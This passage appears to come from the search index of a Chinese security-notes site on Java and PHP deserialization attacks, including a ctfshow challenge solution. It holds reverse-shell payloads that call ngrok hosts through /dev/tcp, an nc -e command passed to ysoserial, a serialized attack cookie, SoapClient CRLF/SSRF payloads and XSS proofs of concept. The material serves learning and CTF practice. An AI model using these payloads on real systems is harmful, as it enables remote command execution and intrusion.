public int id ; public User () { } public String getName () { return name ; } public String getyyds () { return this . wh1speryyds ; } public void setName ( String name ) { User . name = name ; } public int getId () { return this . id ; } public void setId ( int id ) { this . id = id ; } private void readObject ( ObjectInputStream in ) throws Exception { in . defaultReadObject (); Tools . whatyouwant ( this . wh1speryyds ); } } User\u7c7b\u91cd\u5199\u4e86 readObject \u65b9\u6cd5\uff0c\u8c03\u7528\u4e86\u5de5\u5177\u7c7b Tools \u4e2d\u7684 whatyouwant \u65b9\u6cd5\uff1a public static String whatyouwant ( String commandStr ) { BufferedReader br = null ; try { Process p = Runtime . getRuntime (). exec ( new String [] { \"/bin/bash\" , \"-c\" , commandStr }); //\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 br = new BufferedReader ( new InputStreamReader ( p . getInputStream ())); String line = null ; StringBuilder sb = new StringBuilder (); while (( line = br . readLine ()) != null ) { sb . append ( line + \"\\n\" ); } return sb . toString (); } catch ( Exception var5 ) { var5 . printStackTrace (); return \"error\" ; } } \u73b0\u5728\u601d\u8def\u5f88\u6e05\u6670\u4e86\uff1a\u63a7\u5236User\u7c7b\u4e2d\u7684wh1speryyds\u7684\u503c \u2192 \u89e6\u53d1readObject \u2192 Tool.whatyouwant()\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002 \u751f\u6210cookie\uff1a @test public void text (){ User user = new User (); user . setWh1speryyds ( \"/bin/bash -i >& /dev/tcp/8.tcp.ngrok.io/16492 0>&1\" ); try { System . out . println ( Tools . base64Encode ( Tools . serialize ( user )). toString ()); System . out . println ( user . getyyds ()); } catch ( Exception e ) { e . printStackTrace (); } } \u6293\u5305\uff0c\u5728cookie\u4e2d\u6dfb\u52a0 user=rO0ABXNyABZjb20uaGVhLmRlbW8udXNlci5Vc2VyAAAAAAAAAAECAAJJAAJpZEwAC3doMXNwZXJ5eWRzdAASTGphdmEvbGFuZy9TdHJpbmc7eHAAAAAAdAAyL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzgudGNwLm5ncm9rLmlvLzE2NDkyIDA \u7136\u540engrok\u4e3b\u673a\u4e0a\u76d1\u542c nc -lvp 7777 \u5c31\u4f1a\u6536\u5230\u53cd\u5f39\u7684shell\u4e86 \u8865\u5145\uff1a \u4e00\u6bb5\u6570\u636e\u4ee5 rO0AB \u5f00\u5934\uff0c\u4f60\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a\u8fd9\u4e32\u5c31\u662fJAVA\u5e8f\u5217\u5316base64\u52a0\u5bc6\u7684\u6570\u636e \u6216\u8005\u5982\u679c\u4ee5 aced \u5f00\u5934\uff0c\u90a3\u4e48\u5c31\u662f\u8fd9\u4e00\u6bb5java\u5e8f\u5217\u5316\u768416\u8fdb\u5236 import base64 a = \"rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu\" b = base64 . b64decode ( a ) . encode ( 'hex' ) print ( b ) \u518d\u5229\u7528 SerializationDumper \u89e3\u6790\u6570\u636e\uff08\u53cd\u5e8f\u5217\u5316\uff09 java -jar SerializationDumper.jar base64\u540e\u7684\u6570\u636e \u91cd\u65b0\u6253\u5305\u6210\u5e8f\u5217\u5316\u5b57\u7b26\u4e32 java -jar ysoserial-master-8eb5cbfbf6-1.jar ROME \"nc 4.tcp.ngrok.io 16215 \u2013e /bin/sh\" > xiaodi.bin \u5c06\u5e8f\u5217\u5316/\u7f16\u7801\u540e\u7684payload\u653e\u5165token\u6267\u884c\uff0c\u62ff\u5230\u53cd\u5f39shell","title":"Java\u53cd\u5e8f\u5217\u5316"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#java","text":"","title":"Java\u53cd\u5e8f\u5217\u5316"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#java_1","text":"Java \u5e8f\u5217\u5316\u662f\u6307\u628a Java \u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u8282\u5e8f\u5217\u7684\u8fc7\u7a0b\u3002 Java \u53cd\u5e8f\u5217\u5316\u662f\u6307\u628a\u5b57\u8282\u5e8f\u5217\u6062\u590d\u4e3a Java \u5bf9\u8c61\u7684\u8fc7\u7a0b\u3002","title":"\u4ec0\u4e48\u662fJava\u5e8f\u5217\u5316"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","text":"\u4f7f\u7528\u5230JDK\u4e2d\u5173\u952e\u7c7b ObjectOutputStream (\u5bf9\u8c61\u8f93\u51fa\u6d41) \u548c**ObjectInputStream**(\u5bf9\u8c61\u8f93\u5165\u6d41) ObjectOutputStream \u7c7b\u4e2d\uff1a\u901a\u8fc7\u4f7f\u7528 writeObject(Object object) \u65b9\u6cd5\uff0c\u5c06\u5bf9\u8c61\u4ee5\u4e8c\u8fdb\u5236\u683c\u5f0f\u8fdb\u884c\u5199\u5165\u3002 ObjectInputStream \u7c7b\u4e2d\uff1a\u901a\u8fc7\u4f7f\u7528 readObject()\u65b9\u6cd5\uff0c\u4ece\u8f93\u5165\u6d41\u4e2d\u8bfb\u53d6\u4e8c\u8fdb\u5236\u6d41\uff0c\u8f6c\u6362\u6210\u5bf9\u8c61\u3002 import java.io.* ; public class main { main () { } //\u5e8f\u5217\u5316\u51fd\u6570 public static byte [] serialize ( Object obj ) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( baos ); oos . writeObject ( obj ); return baos . toByteArray (); } //\u53cd\u5e8f\u5217\u5316\u51fd\u6570 public static Object unserialize ( byte [] bytes ) throws IOException , ClassNotFoundException { var ois = new ObjectInputStream ( new ByteArrayInputStream ( bytes )); return ois . readObject (); } } \u6ce8\uff1a\u53ea\u6709\u5b9e\u73b0Serializable\u63a5\u53e3\u7684\u7c7b\u624d\u53ef\u4ee5\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u4e0e\u5e8f\u5217\u5316","title":"\u5b9e\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_2","text":"\u6838\u5fc3Controller\uff1a @ResponseBody @RequestMapping ({ \"/\" }) public String index ( HttpServletRequest request , HttpServletResponse response , @RequestParam String name ) throws Exception { Cookie [] cookies = request . getCookies (); //\u83b7\u53d6\u8bf7\u6c42\u7684\u6240\u6709cookie boolean exist = false ; Cookie cookie = null ; User user = null ; User . name = request . getParameter ( \"name\" ); if ( cookies != null ) { Cookie [] var8 = cookies ; int var9 = cookies . length ; for ( int var10 = 0 ; var10 < var9 ; ++ var10 ) { //\u627e\u5230key\u503c\u4e3auser\u7684cookie Cookie c = var8 [ var10 ] ; if ( c . getName (). equals ( \"user\" )) { exist = true ; cookie = c ; break ; } } } if ( exist ) { byte [] bytes = Tools . base64Decode ( cookie . getValue ()); //\u83b7\u53d6key\u503c\u4e3auser\u7684cookie\u7684\u503c\u8fdb\u884cbase64\u89e3\u7801 try { user = ( User ) Tools . deserialize ( bytes ); //**\u53cd\u5e8f\u5217\u5316** } catch ( Exception e ) { e . printStackTrace (); } } else { user = new User (); user . setId ( 1 ); user . setName ( \"admin\" ); try { cookie = new Cookie ( \"user\" , Tools . base64Encode ( Tools . serialize ( user ))); } catch ( Exception e ) { e . printStackTrace (); } response . addCookie ( cookie ); } request . setAttribute ( \"user\" , user ); return user . getName (); } \u627e\u5230\u8bf7\u6c42\u4e2dkey\u503c\u4e3a user \u7684cookie\uff0c \u7136\u540e\u5c31\u884cbase64\u89e3\u7801\u7136\u540e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c \u5982\u679c\u6ca1\u6709\u8fd9\u6837\u7684cookie\u5c31\u65b0\u751f\u6210\u4e00\u4e2a\u7136\u540e\u8fd4\u56de name \u5c5e\u6027\u7684\u503c\u3002\u53cd\u5e8f\u5217\u5316\u7684\u70b9\u5c31\u662f\u52a0\u661f\u53f7\uff08*\uff09\u7684\u4ee3\u7801\uff0c \u6211\u4eec\u9700\u8981\u4f2a\u9020cookie\uff0c\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u7684\u70b9\u3002 User\u7c7b\uff1a public class User implements Serializable { private static final long serialVersionUID = 1L ; public static String name ; private String wh1speryyds ; public int id ; public User () { } public String getName () { return name ; } public String getyyds () { return this . wh1speryyds ; } public void setName ( String name ) { User . name = name ; } public int getId () { return this . id ; } public void setId ( int id ) { this . id = id ; } private void readObject ( ObjectInputStream in ) throws Exception { in . defaultReadObject (); Tools . whatyouwant ( this . wh1speryyds ); } } User\u7c7b\u91cd\u5199\u4e86 readObject \u65b9\u6cd5\uff0c\u8c03\u7528\u4e86\u5de5\u5177\u7c7b Tools \u4e2d\u7684 whatyouwant \u65b9\u6cd5\uff1a public static String whatyouwant ( String commandStr ) { BufferedReader br = null ; try { Process p = Runtime . getRuntime (). exec ( new String [] { \"/bin/bash\" , \"-c\" , commandStr }); //\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 br = new BufferedReader ( new InputStreamReader ( p . getInputStream ())); String line = null ; StringBuilder sb = new StringBuilder (); while (( line = br . readLine ()) != null ) { sb . append ( line + \"\\n\" ); } return sb . toString (); } catch ( Exception var5 ) { var5 . printStackTrace (); return \"error\" ; } } \u73b0\u5728\u601d\u8def\u5f88\u6e05\u6670\u4e86\uff1a\u63a7\u5236User\u7c7b\u4e2d\u7684wh1speryyds\u7684\u503c \u2192 \u89e6\u53d1readObject \u2192 Tool.whatyouwant()\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002 \u751f\u6210cookie\uff1a @test public void text (){ User user = new User (); user . setWh1speryyds ( \"/bin/bash -i >& /dev/tcp/8.tcp.ngrok.io/16492 0>&1\" ); try { System . out . println ( Tools . base64Encode ( Tools . serialize ( user )). toString ()); System . out . println ( user . getyyds ()); } catch ( Exception e ) { e . printStackTrace (); } } \u6293\u5305\uff0c\u5728cookie\u4e2d\u6dfb\u52a0 user=rO0ABXNyABZjb20uaGVhLmRlbW8udXNlci5Vc2VyAAAAAAAAAAECAAJJAAJpZEwAC3doMXNwZXJ5eWRzdAASTGphdmEvbGFuZy9TdHJpbmc7eHAAAAAAdAAyL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzgudGNwLm5ncm9rLmlvLzE2NDkyIDA \u7136\u540engrok\u4e3b\u673a\u4e0a\u76d1\u542c nc -lvp 7777 \u5c31\u4f1a\u6536\u5230\u53cd\u5f39\u7684shell\u4e86 \u8865\u5145\uff1a \u4e00\u6bb5\u6570\u636e\u4ee5 rO0AB \u5f00\u5934\uff0c\u4f60\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a\u8fd9\u4e32\u5c31\u662fJAVA\u5e8f\u5217\u5316base64\u52a0\u5bc6\u7684\u6570\u636e \u6216\u8005\u5982\u679c\u4ee5 aced \u5f00\u5934\uff0c\u90a3\u4e48\u5c31\u662f\u8fd9\u4e00\u6bb5java\u5e8f\u5217\u5316\u768416\u8fdb\u5236 import base64 a = \"rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu\" b = base64 . b64decode ( a ) . encode ( 'hex' ) print ( b ) \u518d\u5229\u7528 SerializationDumper \u89e3\u6790\u6570\u636e\uff08\u53cd\u5e8f\u5217\u5316\uff09 java -jar SerializationDumper.jar base64\u540e\u7684\u6570\u636e \u91cd\u65b0\u6253\u5305\u6210\u5e8f\u5217\u5316\u5b57\u7b26\u4e32 java -jar ysoserial-master-8eb5cbfbf6-1.jar ROME \"nc 4.tcp.ngrok.io 16215 \u2013e /bin/sh\" > xiaodi.bin \u5c06\u5e8f\u5217\u5316/\u7f16\u7801\u540e\u7684payload\u653e\u5165token\u6267\u884c\uff0c\u62ff\u5230\u53cd\u5f39shell","title":"\u5229\u7528"},{"location":"Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"PHP\u53cd\u5e8f\u5217\u5316 \u00b6 \u57fa\u7840\u77e5\u8bc6 \u00b6 \u5f53\u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26(public\u3001protected\u3001private)\u4e0d\u540c\u65f6\uff0c\u5e8f\u5217\u5316\u540e\u7684\u7ed3\u679c\u4e5f\u4e0d\u540c public \u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u53d8\u91cf\u540d\u4e0d\u4f1a\u66f4\u6539 protected \u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\\x00*\\x00 private \u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\\x00\u7c7b\u540d\\x00 \u8bbf\u95ee\u4fee\u9970\u7b26 Public Protected Private \u672c\u7c7b \u53ef\u4ee5\u8bbf\u95ee \u53ef\u4ee5\u8bbf\u95ee \u53ef\u4ee5\u8bbf\u95ee \u5b50\u7c7b \u53ef\u4ee5\u8bbf\u95ee \u53ef\u4ee5\u8bbf\u95ee \u4e0d\u80fd\u8bbf\u95ee \u5916\u90e8 \u53ef\u4ee5\u8bbf\u95ee \u4e0d\u80fd\u8bbf\u95ee \u4e0d\u80fd\u8bbf\u95ee \u9b54\u672f\u65b9\u6cd5 \u9b54\u672f\u65b9\u6cd5 \u4f55\u65f6\u8c03\u7528 __construct **\u521b\u5efa\u65b0\u5bf9\u8c61**\u65f6\u8c03\u7528 __wakeup \u5728**\u4f7f\u7528 unserialize() \u65f6**\uff0c\u4f1a\u68c0\u67e5\u662f\u5426\u5b58\u5728\u4e00\u4e2a __wakeup() \u9b54\u672f\u65b9\u6cd5\u3002\u5982\u679c\u5b58\u5728\uff0c\u5219\u8be5\u65b9\u6cd5\u4f1a\u5148\u88ab\u8c03\u7528\uff0c\u9884\u5148\u51c6\u5907\u5bf9\u8c61\u9700\u8981\u7684\u8d44\u6e90 __toString __toString() \u65b9\u6cd5\u7528\u4e8e\u5b9a\u4e49\u4e00\u4e2a\u7c7b\u88ab**\u5f53\u6210\u5b57\u7b26\u4e32\u65f6**\u8be5\u5982\u4f55\u5904\u7406 __destruct __destruct\u51fd\u6570\u4f1a\u5728\u5230\u67d0\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5f15\u7528\u90fd\u88ab\u5220\u9664\u6216\u8005\u5f53\u5bf9\u8c61\u88ab\u663e\u5f0f\u9500\u6bc1\u65f6\u6267\u884c __invoke \u5f53\u5c1d\u8bd5**\u4ee5\u8c03\u7528\u51fd\u6570\u7684\u65b9\u5f0f\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61**\u65f6\uff0c __invoke() \u65b9\u6cd5\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528\uff08\u7c7b\u540d+\u62ec\u53f7\u5f62\u5f0f\uff09 __set **\u7ed9\u4e0d\u53ef\u8bbf\u95ee\u5c5e\u6027\u8d4b\u503c**\u65f6\uff0c __set() \u4f1a\u88ab\u8c03\u7528 __get **\u8bfb\u53d6\u4e0d\u53ef\u8bbf\u95ee\u5c5e\u6027**\u8d4b\u503c\u65f6\uff0c __get() \u4f1a\u88ab\u8c03\u7528 __unset \u5bf9**\u4e0d\u53ef\u8bbf\u95ee\u5c5e\u6027\u8c03\u7528unset()**\u65f6\uff0c __unset() \u4f1a\u88ab\u8c03\u7528 __isset \u5728**\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u4e0a\u8c03\u7528isset()**\u6216empty()\u89e6\u53d1 __call \u5728\u5bf9\u8c61\u4e2d\u8c03\u7528\u4e00\u4e2a**\u4e0d\u53ef\u8bbf\u95ee\u65b9\u6cd5**\u65f6\uff0c __call() \u4f1a\u88ab\u8c03\u7528 __sleep \u6267\u884c**serialize()**\u65f6\uff0c\u5148\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570 POP\u94fe \u00b6 \u5982\u679c\u5173\u952e\u4ee3\u7801\u4e0d\u5728\u9b54\u672f\u65b9\u6cd5\u4e2d\uff0c\u800c\u662f\u5728\u4e00\u4e2a\u7c7b\u7684\u666e\u901a\u65b9\u6cd5\u4e2d\u3002\u8fd9\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7\u5bfb\u627e\u76f8\u540c\u7684\u51fd\u6570\u540d\u5c06\u7c7b\u7684\u5c5e\u6027\u548c\u654f\u611f\u51fd\u6570\u7684\u5c5e\u6027\u8054\u7cfb\u8d77\u6765 <?php class Modifier { protected $var ; public function append ( $value ){ include ( $value ); } public function __invoke (){ $this -> append ( $this -> var ); } } class Show { public $source ; public $str ; public function __construct ( $file = 'index.php' ){ $this -> source = $file ; echo 'Welcome to ' . $this -> source . \"<br>\" ; } public function __toString (){ return $this -> str -> source ; } public function __wakeup (){ if ( preg_match ( \"/gopher|http|file|ftp|https|dict|\\.\\./i\" , $this -> source )) { echo \"hacker\" ; $this -> source = \"index.php\" ; } } } class Test { public $p ; public function __construct (){ $this -> p = array (); } public function __get ( $key ){ $function = $this -> p ; return $function (); } } \u6700\u7ec8\u662f\u5e0c\u671b\u901a\u8fc7 Modifier \u5f53\u4e2d\u7684 append \u65b9\u6cd5\u5b9e\u73b0\u672c\u5730\u6587\u4ef6\u5305\u542b\u8bfb\u53d6\u6587\u4ef6\uff0c\u56de\u6eaf\u5230\u8c03\u7528\u5b83\u7684 __invoke \uff0c\u5f53\u6211\u4eec**\u5c06\u5bf9\u8c61\u8c03\u7528\u4e3a\u51fd\u6570\u65f6\u89e6\u53d1**,\u53d1\u73b0\u5728 Test \u7c7b\u5f53\u4e2d\u7684 __get \u65b9\u6cd5\uff0c\u518d\u56de\u6eaf\u5230 Show \u5f53\u4e2d\u7684 __toString \uff0c\u518d\u56de\u6eaf\u5230 Show \u5f53\u4e2d\u7684 __wakeup \u5f53\u4e2d\u6709preg_match\u53ef\u4ee5\u89e6\u53d1 __toString \u5bf9\u8c61\u6ce8\u5165 \u00b6 \u5bf9\u8c61\u6ce8\u5165\u524d\u63d0\uff1a 1\u3001 unserialize \u7684\u53c2\u6570\u53ef\u63a7\u3002 2\u3001 \u4ee3\u7801\u91cc\u6709\u5b9a\u4e49\u4e00\u4e2a\u542b\u6709\u9b54\u672f\u65b9\u6cd5\u7684\u7c7b\uff0c\u5e76\u4e14\u8be5\u65b9\u6cd5\u91cc\u51fa\u73b0\u4e00\u4e9b\u4f7f\u7528\u7c7b\u6210\u5458\u53d8\u91cf\u4f5c\u4e3a\u53c2\u6570\u7684\u5b58\u5728\u5b89\u5168\u95ee\u9898\u7684\u51fd\u6570\u3002 <?php class Person { public $name = \"cat\" ; public $age = 2 ; } $b = new Person (); $b -> name = 'dog' ; $b -> age = 3 ; echo serialize ( $b ); // O:6:\"Person\":2:{s:4:\"name\";s:3:\"dog\";s:3:\"age\";i:3;} echo urlencode ( serialize ( $b )); ?> \u628a\u5e8f\u5217\u5316\u540e\u5b57\u7b26\u4e32\u8fdb\u884c\u63d0\u4ea4\uff0c\u53cd\u5e8f\u5217\u5316\u65f6\u89e6\u53d1\u5bf9\u8c61\u6ce8\u5165 PHP\u539f\u751f\u53cd\u5e8f\u5217\u5316 \u00b6 SoapClient \u00b6 php\u5728\u5b89\u88c5php-soap\u62d3\u5c55\u540e\uff0c\u53ef\u4ee5\u53cd\u5e8f\u5217\u5316\u539f\u751f\u7c7bSoapClient\uff0c\u6765\u53d1\u9001http post\u8bf7\u6c42\u3002 \u5fc5\u987b\u8c03\u7528SoapClient\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u89e6\u53d1SoapClient\u7684__call\u9b54\u672f\u65b9\u6cd5\u3002 \u901a\u8fc7CRLF\u6765\u6dfb\u52a0\u8bf7\u6c42\u4f53\uff1aSoapClient\u53ef\u4ee5\u6307\u5b9a\u8bf7\u6c42\u7684user-agent\u5934\uff0c\u901a\u8fc7\u6dfb\u52a0\u6362\u884c\u7b26\u7684\u5f62\u5f0f\u6765\u52a0\u5165\u5176\u4ed6\u8bf7\u6c42\u5185\u5bb9 \u9996\u5148\u5728VPS\u4e0a\u9762\u5f00\u542f\u76d1\u542c nc -lvvp 9328 \u8fd0\u884c <?php $a = new SoapClient ( null , array ( 'uri' => 'aaa' , 'location' => 'http://127.0.0.1:5555/path' )); $b = serialize ( $a ); echo $b ; $c = unserialize ( $b ); $c -> dotast (); //\u8c03\u7528\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u8ba9SoapClient\u8c03\u7528__call vps\u4f1a\u6536\u5230\u8bf7\u6c42\uff0c\u5176\u4e2d\u7684header\u5b58\u5728 SOAPAction: \"aaa#dotast\" \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u6ce8\u5165\u6211\u4eec\u81ea\u5df1\u6076\u610f\u6784\u9020\u7684**CRLF**\u5373\u63d2\u5165**\\r\\n**\uff0c\u6765\u63a7\u5236POST\u8bf7\u6c42\u5934 <?php $a = new SoapClient ( null , array ( 'uri' => \"aaa \\r\\n\\r\\n bbb \\r\\n \" , 'location' => 'http://127.0.0.1:5555/path' )); $b = serialize ( $a ); echo $b ; $c = unserialize ( $b ); $c -> dotast (); \u4f46\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u9700\u8981\u89e3\u51b3\uff0cPOST\u6570\u636e\u6307\u5b9a\u8bf7\u6c42\u5934\u4e3a Content-Type:application/x-www-form-urlencoded \uff0c\u6211\u4eec\u9700\u8981\u63a7\u5236 Content-Type \uff0c\u4f46\u4ece\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5b83\u4f4d\u4e8e SOAPAtion \u4e0a\u65b9 \u7ee7\u7eed\u5f80\u4e0a\uff0c\u53ef\u4ee5\u53d1\u73b0 User-Agent \u4f4d\u4e8e Content-Type \u4e0a\u65b9\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u4e5f\u53ef\u4ee5\u8fdb\u884c\u6ce8\u5165\uff0c\u6240\u4ee5\u6211\u4eec\u518d User-Agent \u8fdb\u884c\u6ce8\u5165 <?php $post_string = \"dotast=cool\" ; $a = new SoapClient ( null , array ( 'location' => 'http://127.0.0.1:5555/path' , 'user_agent' => \"dotast \\r\\n Content-Type:application/x-www-form-urlencoded \\r\\n \" . \"Content-Length: \" . ( string ) strlen ( $post_string ) . \" \\r\\n\\r\\n \" . $post_string , 'uri' => \"aaa\" )); $b = serialize ( $a ); echo $b ; $c = unserialize ( $b ); $c -> dotast (); \u5982\u56fe\uff0c\u6784\u9020\u4efb\u610fpost\u8bf7\u6c42\u6210\u529f\uff01\u5230\u6b64\uff0c\u4e00\u7cfb\u5217\u6d41\u7a0b\u90fd\u5f04\u61c2\u540e\uff0c\u6211\u4eec\u56de\u5230ctfshow-web259\u9898\u76ee\u672c\u8eab flag.php $xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); array_pop($xff); $ip = array_pop($xff); if($ip!=='127.0.0.1'){ die('error'); }else{ $token = $_POST['token']; if($token=='ctfshow'){ file_put_contents('flag.txt',$flag); } } index.php <?php highlight_file ( __FILE__ ); $vip = unserialize ( $_GET [ 'vip' ]); //vip can get flag one key $vip -> getFlag (); \u5229\u7528ssrf\u8bbf\u95eeflag.php\uff0c\u7136\u540e\u6784\u9020post\u6570\u636e token=ctfshow \u8fd8\u6709xff\u8bf7\u6c42\u5934\uff0cpaylaod\u5982\u4e0b <?php $post_string = \"token=ctfshow\" ; $a = new SoapClient ( null , array ( 'location' => 'http://127.0.0.1/flag.php' , 'user_agent' => \"dotast \\r\\n Content-Type:application/x-www-form-urlencoded \\r\\n \" . \"X-Forwarded-For: 127.0.0.1,127.0.0.1 \\r\\n \" . \"Content-Length: \" . ( string ) strlen ( $post_string ) . \" \\r\\n\\r\\n \" . $post_string , 'uri' => \"aaa\" )); $b = serialize ( $a ); echo urlencode ( $b ); \u8fd9\u91cc X-Forwarded-For \u91cc\u9762\u9700\u8981\u4e24\u4e2a 127.0.0.1 \u7684\u539f\u56e0\u662fdocker\u73af\u5883cloudfare\u4ee3\u7406\u6240\u5bfc\u81f4 \u8fd0\u884cphp get\u53c2\u6570 vip \u4f20\u5165 \u518d\u8bbf\u95eeflag.txt\u5c31\u6709\u4e86 Error \u00b6 Error\u7c7b\u5c31\u662fphp\u7684\u4e00\u4e2a\u5185\u7f6e\u7c7b\u7528\u4e8e\u81ea\u52a8\u81ea\u5b9a\u4e49\u4e00\u4e2a Error \uff0c\u5728php7\u7684\u73af\u5883\u4e0b\u53ef\u80fd\u4f1a\u9020\u6210\u4e00\u4e2a xss \u6f0f\u6d1e\uff0c\u56e0\u4e3a\u5b83\u5185\u7f6e\u6709\u4e00\u4e2a toString \u7684\u65b9\u6cd5\u3002 <?php $a = $_GET [ 'test' ]; echo unserialize ( $a ); \u6784\u9020poc <?php $a = new Error ( \"<script>alert('xss')</script>\" ); $b = serialize ( $a ); echo urlencode ( $b ); ?> \u5c06\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u4e32\u4f20\u5165test\u53d8\u91cf\u5373\u53ef**\u9020\u6210\u5f39\u7a97** Exception\u7c7b\u8ddfError\u7c7b\u539f\u7406\u4e00\u6837\uff0c\u4f46\u662f\u4e5f\u9002\u7528\u4e8ePHP5 <?php $x = new Exception ( \"<script>alert('xss')</script>\" ); $y = serialize ( $x ); echo urlencode ( $y ); ?> Phar\u53cd\u5e8f\u5217\u5316web276 \u00b6 \u539f\u7406 \u00b6 phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data \u5f53\u53d7\u5f71\u54cd\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u8c03\u7528phar\u6587\u4ef6\u65f6\uff0c\u4f1a\u81ea\u52a8\u53cd\u5e8f\u5217\u5316meta-data\u5185\u7684\u5185\u5bb9 phar\u6587\u4ef6 \u00b6 PHAR\uff08PHP\u5f52\u6863\uff09\u6587\u4ef6\u662f\u4e00\u79cd\u6253\u5305\u683c\u5f0f\uff0c\u901a\u8fc7\u5c06\u8bb8\u591aPHP\u4ee3\u7801\u6587\u4ef6\u548c\u5176\u4ed6\u8d44\u6e90\uff08\u4f8b\u5982\u56fe\u50cf\uff0c\u6837\u5f0f\u8868\u7b49\uff09\u6346\u7ed1\u5230\u4e00\u4e2a\u5f52\u6863\u6587\u4ef6 php\u901a\u8fc7\u7528\u6237\u5b9a\u4e49\u548c\u5185\u7f6e\u7684\u201c\u6d41\u5305\u88c5\u5668\u201d\u5b9e\u73b0\u590d\u6742\u7684\u6587\u4ef6\u5904\u7406\u529f\u80fd\u3002 phar:// \u5c31\u662f\u4e00\u79cd\u5185\u7f6e\u7684\u6d41\u5305\u88c5\u5668 php\u4e2d\u4e00\u4e9b\u5e38\u89c1\u7684\u6d41\u5305\u88c5\u5668\u5982\u4e0b\uff1a file:// \u2014 \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff0c\u5728\u7528\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\u65f6\u9ed8\u8ba4\u5c31\u4f7f\u7528\u8be5\u5305\u88c5\u5668 http:// \u2014 \u8bbf\u95ee HTTP(s) \u7f51\u5740 ftp:// \u2014 \u8bbf\u95ee FTP(s) URLs php:// \u2014 \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09 zlib:// \u2014 \u538b\u7f29\u6d41 data:// \u2014 \u6570\u636e\uff08RFC 2397\uff09 glob:// \u2014 \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84\u6a21\u5f0f phar:// \u2014 PHP \u5f52\u6863 ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 \u97f3\u9891\u6d41 expect:// \u2014 \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41 phar\u6587\u4ef6\u7ed3\u6784 \u00b6 stub:phar\u6587\u4ef6\u7684\u6807\u5fd7\uff0c\u5fc5\u987b\u4ee5 xxx __HALT_COMPILER();?> \u7ed3\u5c3e\uff0c\u5426\u5219\u65e0\u6cd5\u8bc6\u522b\u3002xxx\u53ef\u4ee5\u4e3a\u81ea\u5b9a\u4e49\u5185\u5bb9\u3002 